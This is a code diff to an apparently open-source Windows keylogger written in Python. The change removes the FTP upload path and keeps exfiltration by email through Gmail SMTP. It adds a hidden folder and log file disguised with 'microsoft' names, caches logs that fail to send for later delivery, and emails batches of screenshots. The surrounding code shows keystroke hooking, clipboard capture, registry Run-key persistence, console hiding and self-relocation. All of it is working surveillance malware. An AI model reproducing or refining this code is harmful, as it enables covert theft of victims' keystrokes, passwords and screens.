@@ -8,27 +8,15 @@ MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE
 NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
 '''
 
-import smtplib, time, os, threading, sys, subprocess
+import smtplib, time, os, threading, sys, subprocess, pythoncom, pyHook, pyautogui
 import win32console, win32gui, win32event, win32api, winerror, win32clipboard
-from sys import exit; from ftplib import FTP; from urllib2 import urlopen; from shutil import copyfile
+from sys import exit; from urllib2 import urlopen; from shutil import copyfile
 from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage; from _winreg import *
-try:
-    import pythoncom, pyHook, pyautogui
-    from pyHook import GetKeyState, HookConstants
-except ImportError:
-    print "required pyhook, pywin32 and pyautogui"
-    exit()
+from pyHook import GetKeyState, HookConstants
 
 
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
-
-blnFTP = "False"  # if using ftp set this to True and configure the options below
-strFtpServer = ""
-intFtpPort = 21
-strFtpUser = ""
-strFtpPass = ""
-strFtpRemotePath = "/"
 
 intCharPerSend = 1000  # set num of chars before send log/store
 
@@ -47,6 +35,15 @@ blnAddToStartup = "False"
 
 blnLogClipboard = "False"
 blnMelt = "False"
+
+
+# variables/constants
+TMP = os.environ["TEMP"]
+APPDATA = os.environ["APPDATA"]
+cPuffDir = TMP + "/microsoft_data_dir"
+strLogPath = cPuffDir + "/microsoft_log.txt"
+blnFirstSend = "True"
+intLogChars = 0
 
 
 def hide():
@@ -75,7 +72,6 @@ objTimer2 = threading.Timer(0, GetExIp); objTimer2.start()
 
 
 def melt():
-    TMP = os.environ["TEMP"]
     strNewFile = TMP + "\\" + os.path.basename(sys.argv[0])
     if not os.getcwd() == TMP:  # if the current dir is not temp
         subprocess.Popen("ping 1.1.1.1 -n 1 & move /y " + os.path.realpath(sys.argv[0]) + " " +  # move file to TMP and then relaunch
@@ -89,7 +85,7 @@ if blnMelt == "True":
 def AddToStartup():
     try:
         strPath = os.path.realpath(sys.argv[0])
-        strAppPath = os.environ["APPDATA"] + "\\" + os.path.basename(strPath)
+        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
         copyfile(strPath, strAppPath)
 
         objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
@@ -99,9 +95,6 @@ def AddToStartup():
 
 if blnAddToStartup == "True":
     AddToStartup()
-
-blnFirstSend = "True"
-intLogChars = 0
 
 
 def MonitorClipboard():  # Function to get clipboard data
@@ -126,7 +119,7 @@ def MonitorClipboard():  # Function to get clipboard data
             strLogs += "\n" + "\n" + "* * * * * * Clipboard * * * * * *" + "\n" + strClipData + "\n" + \
                        "* * * * * * Clipboard * * * * * *" + "\n" + "\n"
             strClipDataOld = strClipData
-        time.sleep(1)  # check every second
+        time.sleep(3)  # check every 3 seconds
 
 if blnLogClipboard == "True":  # if the user wants to capture clipboard data
     ClipboardThread = threading.Thread(target=MonitorClipboard)
@@ -145,49 +138,35 @@ def OnKeyboardEvent(event):
         global blnFirstSend  # easier to just define this variable to be global within the functions
         try:
             if blnFirstSend == "True":
-                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
-                strMessage = strDateTime + "\n\n" + strLogs
+                strMessage = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n"
                 blnFirstSend = "False"
-            else:
-                strMessage = strLogs
+            else: strMessage = ""
 
-            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From " +strExIP, strMessage)
+            if os.path.isfile(strLogPath):  # if there are old logs that need to be sent, add them to message
+                objFile = open(strLogPath, "r")
+                strOldLogs = objFile.read()
+                objFile.close()
+
+                strMessage += strOldLogs + strLogs
+                os.remove(strLogPath)  # delete old log file
+            else:
+                strMessage += strLogs
+
+            strEmail = "Subject: {}\n\n{}".format("New Keylogger Logs From " + strExIP, strMessage)
 
             SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
             SmtpServer.ehlo()   # identifies you to the smtp server
             SmtpServer.login(strEmailAc, strEmailPass)
-            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
+            SmtpServer.sendmail(strEmailAc, strEmailAc, strEmail)
             SmtpServer.close()
-        except:
-            time.sleep(10)  # if the email cannot be sent, try again every 10 seconds
-            SendMessages(strLogs, strEmailAc, strEmailPass, strExIP)
-
-    def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath):
-        global blnFirstSend
-        try:
-            ftp = FTP(); ftp.connect(strFtpServer, 21)
-            ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
-            # connect to ftp server
-
-            TMP = os.environ["TEMP"]
-            objLogFile = open(TMP + "/log.txt", 'w')
-            if blnFirstSend == "True":
-                objLogFile.write("\n" + "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
-                blnFirstSend = "False"
-            objLogFile.write(strLogs)
-            objLogFile.close()
-            # create log file
-
-            arFileList = ftp.nlst()
-            if "log.txt" in arFileList:
-                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("APPE log.txt", objLogFile)
+        except:  # if the logs cannot be sent, save them to txt file to try again later
+            if not os.path.isfile(strLogPath):
+                objFile = open(strLogPath, "w")
             else:
-                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("STOR log.txt", objLogFile)
-            objLogFile.close(); ftp.close()
-            objLogFile = open(TMP + "/log.txt", 'w'); objLogFile.close()  # delete log file contents
-        except:
-            time.sleep(10)  # if messages cannot be sent, try again every 10 seconds
-            SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath)
+                objFile = open(strLogPath, "a")
+
+            objFile.write(strMessage)
+            objFile.close()
 
     def StoreMessagesLocal(strLogs):
         global blnFirstSend
@@ -208,48 +187,41 @@ def OnKeyboardEvent(event):
                 StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=strLogs)
                 StoreLogThread.daemon = True
                 StoreLogThread.start()
-            elif blnFTP == "True":
-                SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath))
-                SendFTPThread.daemon = True
-                SendFTPThread.start()
             else:
                 SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, strExIP))
                 SendMailThread.daemon = True
                 SendMailThread.start()
 
     def SendScreen():  # function to send screens (easier to do this as a new function)
-        if blnFTP == "True":
-            try:
-                ftp = FTP(); ftp.connect(strFtpServer, 21)
-                ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
-                objScrFile = open(strScrPath, "rb")
-                ftp.storbinary("STOR " + strScrPath.split("/")[1], objScrFile)  # copy image to ftp
-                objScrFile.close(); ftp.close()
-            except:
-                pass  # pass to try again later
-        else:
-            try:
-                objMsg = MIMEMultipart()
-                objMsg["Subject"] = "New Screenshot From " + strExIP
-                img = MIMEImage(file(strScrPath, "rb").read())
-                # attach image as original file name
-                img.add_header("Content-Disposition", "attachment; filename= %s" % strScrPath.split("/")[1])
+        try:
+            objMsg = MIMEMultipart()
+            objMsg["Subject"] = "New Screenshot From " + strExIP
+
+            for strScrPath in os.listdir(cPuffDir):  # add files to the message
+                strScrFullPath = cPuffDir + "/" + strScrPath
+                img = MIMEImage(file(strScrFullPath, "rb").read())
+                img.add_header('Content-Disposition', 'attachment', filename=strScrPath)
                 objMsg.attach(img)
-                SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465); SmtpServer.ehlo()
-                SmtpServer.login(strEmailAc, strEmailPass)
-                SmtpServer.sendmail(strEmailAc, strEmailAc, objMsg.as_string())
-                SmtpServer.close()
-            except:
-                pass
-        os.remove(strScrPath)  # delete file after sending
+
+            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465); SmtpServer.ehlo()
+            SmtpServer.login(strEmailAc, strEmailPass)
+            SmtpServer.sendmail(strEmailAc, strEmailAc, objMsg.as_string())
+            SmtpServer.close()
+        except:  # if the screen cannot send, pass and try again later
+            pass
+        else:
+            for strScrPath in os.listdir(cPuffDir):
+                os.remove(cPuffDir + "/" + strScrPath)  # if the screenshot(s) sent successfully, remove them
 
     def TakeScr():  # function to take screenshot
         if blnStoreLocal == "True":
             threading.Thread(pyautogui.screenshot().save(time.strftime(strScrDir + "/%Y%m%d%H%M%S" + ".png"))).start()
         else:
-            global strScrPath
-            TMP = os.environ["TEMP"]
-            strScrPath = time.strftime(TMP + "/%Y%m%d%H%M%S" + ".png")  # save screenshot with datetime format
+            if not os.path.isdir(cPuffDir):  # if the screen dir doesnt exist, create it
+                os.makedirs(cPuffDir)
+                subprocess.Popen(["attrib", "+H", cPuffDir])  # make folder hidden
+
+            strScrPath = time.strftime(cPuffDir + "/%Y%m%d%H%M%S" + ".png")  # save screenshot with datetime format
             threading.Thread(pyautogui.screenshot().save(strScrPath)).start()
             SendScreenThread = threading.Thread(target=SendScreen)
             SendScreenThread.daemon = True
